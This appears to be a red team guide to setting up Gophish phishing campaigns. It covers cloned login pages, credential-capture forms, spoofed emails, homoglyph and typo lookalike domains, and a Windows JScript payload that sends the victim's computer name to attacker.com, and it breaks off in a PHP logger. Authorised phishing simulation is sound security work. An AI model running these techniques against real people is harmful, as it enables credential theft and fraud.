# Red Team Phishing with Gophish
This guide will help you set up a red team phishing infrastructure as well as creating, perform and evaluate a phishing campaign.
This is the basic lifecycle of your phishingn campaign:
```
+---------------------+
|Get Hardware         |   Order / setup a vServer
+---------------------+
+---------------------+
|Setup                |   Install Gophish & Mail Server
+---------------------+
+---------------------+
|Order Domain         |   Order & setup DNS records
+---------------------+
+---------------------+
|Inform Authorities   |
+---------------------+
+---------------------+
|Dry run campaign     |   Test deliver, payload, tracking
+---------------------+
+---------------------+
|Run campaign         |   Good luck
+---------------------+
+---------------------+
|Evaluate campaign    |   Interpret & visualize results
+---------------------+
```

## Setup
### Requirements
You will need the following components:
* vServer (a regular web hosting will not suffice)
  Preferably running Linux, this guide will assume you are using Ubuntu Server
* Domain Name
* Mail Server
* Creativitiy and some time

### Gophish Installation
1. Download the newest release of Gophish from here https://github.com/gophish/gophish/releases
2. Unzip the archive
3. Run the gophish executable
4. The administrator interface is now reachable under https://127.0.0.1:3333 using the default credentials (admin:gophish)
5. Change the password under "Settings"
6. If you wish to have the web interface not reachable publicly, configure the listeners in "config.json"
7. If you wish to use HTTPS, which is recommended, use letsencrypt (https://letsencrypt.org/getting-started/), you can tell Gophish to use certificate material in "config.json"


**Tip** - Use a screen session for your gophish server or run it as a service (https://gist.github.com/immure/4ac4800189fd3e61f516838d0c35a519#file-gophish-service)

### Domain Name
This step varies to a certain extent due to how domain hosters work.
Information on how to pick a fitting domain name find in the chapter "Tips & Tricks".
Make sure you have the necessary DNS records in place, here an example:
```
$ dig +nocmd myphish.ch any +multiline +noall +answer

myphish.ch. 10800 IN SOA ns1.hostserv.eu. dns.hosttech.eu. (
				2018051615 ; serial
				7200       ; refresh (2 hours)
				120        ; retry (2 minutes)
				2419200    ; expire (4 weeks)
				10800      ; minimum (3 hours)
				)
myphish.ch. 10800 IN MX	10 c.business-mail.eu.
myphish.ch. 3563 IN A 185.101.159.204
myphish.ch. 3563 IN NS ns1.hostserv.eu.
myphish.ch. 3563 IN NS ns3.hostserv.eu.
myphish.ch. 3563 IN NS ns2.hostserv.eu.
```

### Mail Server
How to set up a mail server has been describe thousands of times in the web.
My recommendation, use Mail Hosting out of the box, not only will it save you time (it doesn't cost much either)
but also things like send reputation etc. will be fine out of the box too.

Create a user / mailbox for said domain and take note of the SMTP settings and credentials.

### Gophish Mail Setup
1. Under "Sending Profiles" create a new profile
2. Fill in a fitting name
3. For "Interface Type" choose "SMTP"
4. For "From" type in the mail address of your newly created user
5. For "Host" type in the Hostname or IP address of your mail server (following the example it would be c.business-mail.eu)
6. For "Username" type in the username, this will either be the e-mail address or everything before the @ character
7. For "Password" type in the password set earlier
8. Send a test mail using the according button at the end of the form
9. Tick the box "Ignore Certificate Errors" if you run into any problems when sending a test mail

## Creating your Phishing Campaign
There are many resources on how to design your phishing campaign out there.
Long story short, try to create urgency and plausability.
**Think of what do you want to achieve first.**
Do you wish to have as many users as possible click a link?
Do you wish to farm credentials?
### Email Adresses
First of all, you will need the email adresses of your targets. There are many ways how to collect them.
You can start by checking company websites, certificate transparency (SMIME / PGP), search machine dorks etc.
Once you have collected them, start filling them in on Gophish under "Users & Groups".

**Tip** - Gophish as a import function, even though rather primitive
Make sure you use a csv usingn the follow , as a seperator and the following syntax (this is the first line):
```First Name,Last Name,Position,Email```
### Landing Pages
Gophish allows you to create landing pages, these will help you track clicks on the specified link in your phishing mail automatically.
Furthermore it will allow you to track if the user submits any data in a form on your landing page.
**Redirecting**
If you only want to redirect a user to another site but still track the click, use something along the lines of:
```
<html>
    <script>
        window.location.replace("https://www.legitwebsite.com/some/link");
    </script>
</html>
```
**Faking / Cloning**
If you want to fake an existing website (i.e. OWA Webmail Login), you do not need any fancy tools.
Just copy the source code of the website (in your browser url bar, prepend "view-source:"), copy all content and paste it into the editor of your liking and make edits to your liking.

**Forms**
If you want to check if your targets enter information via  form (i.e. enter credentials) use a form like such:
```
<form action="" method="post" name="form">
    <input name="password" id="password" type="password"/>
    <button type="submit">Submit/button>
</form>
```
*It is important to leave the action empty.*
Make sure to tick "Capture Submitted Data" in order to track when a user submits the form.
Since you are red teaming, DO NOT capture passwords.
You can also provide an URL where the user is redirected to after filling out the form.

<img src="https://i.imgur.com/FQ5C7un.png" width="400">

### Emails
If you want to spoof an existing company / service, start out by cloning a real email. Otherwise try to mimic what you find in your inbox.
You can create a new email under "Email Templates" -> "New Template".

**Adding links to the landing page**
```
<a href="http://{{.URL}}">{{.URL}}</a>
```
**Adding the tracking pixel**
```
{{.Tracker}} 
```
**Adding images inline**
Convert your image to base64 (I use https://www.base64-image.de/) and then insert it:
```
<img alt="picture" src="data:image/png........... YII=">
```

## Phish!
Before you send out your phishing mails, make sure to **test** it by sending it to 2-3 email of your email adresses and then checking if the mails are delivered correctly, the links work and the clicks are registered etc.
**Since this is red teaming and you do not wish to cause any trouble**, inform any authorities which could be interested in what is going on (include domain names, timeframe of campaign, contact person etc.), so if somebody reports the attack, they know what is up (in the case of living in Switzerland, this would be Switch and MELANI).
Now choose a fitting moment for your attack, this depends on your target. Do you know when their IT has a day off? Do your targets all read the mail when they start their day? When do they start their day? 
1. Go to campaigns -> "New Campaign"
3. Pick a name that will make sense even after a good nights sleep
4. Choose the email template and landing page
5. Enter the URL (http://myphish.ch)
6. Pick the time when the emails will be sent to your targets
7. Choose the sending profile 
8. Choose the according group, be careful here!

<img src="https://i.imgur.com/9MiZRal.png" width="400" >


## Evaluate
Gophish already does a great job collecting and visualizing the data for you. 
You can still export it as a csv and create some nice graphs.
Something very important here is that you do not blame any of your targets.
**DO NOT** make public who clicked the link, use numbers / percentages or at least anonymize the names.
Otherwise you risk runing somebodies self-esteem or even worse, getting him into trouble by management - this is not what you are trying to achieve.

Try to track additional metrics such as
* Did the targets read the email? You can tell by correlating the median time between opening the mail and clicking the link
* How often and when was your phishing mail reported to the security team?
* How long did it take for the company to react to the attack?
* What is the ratio between opening the email and clicking the contained link?
Try to come up with specific metrics which provide information about what you are trying to proove with this campaign.
<img src="https://i.imgur.com/GwIxQmN.png">

## Tips & Tricks
### Help
If you help, go check out the gophish user guide:
https://gophish.gitbook.io/user-guide
### Templates
You can find several templates on the web, such as:
https://github.com/rfdevere/templates
### Domains
There are many tricks you can use finding a fitting domain name.

**Homoglyphs**
This is my favorite one, basically it uses similar looking unicode characters as such:
https://google.com becomes https://gооgⅼe.com (<-- hover over this with your mouse)

Further information about homoglyphs:
https://www.irongeek.com/homoglyph-attack-generator.php

**Character swapping**
complicated-domain-name.com becomes complciated-domain-name.com

**Subdomains**
secure-bank.com becomes secure.bank.com

### Tracking executables
Want to see if your targets will download files (use a form and gophish tracking capabilities) from your landing page and even run them?

**Example "Program"**
This little executable will run on windows and connect to attacker.com passing the computer name
```
var WinHttpReq = new ActiveXObject("WinHttp.WinHttpReque1st.5.1");
var network = new ActiveXObject('WScript.Network');
var temp = WinHttpReq.Open("GET", "https://attacker.com/hit.php?name="+network.computerName, false);
WinHttpReq.Send();
var strResult = WinHttpReq.ResponseText;
WScript.Sleep(1500);
WScript.Echo("Success!");
```
**Example Backend Logging**
This PHP will receive the connection and append the current time and computer name to a file
```
<?php
    if(isset($_GET["name"])){
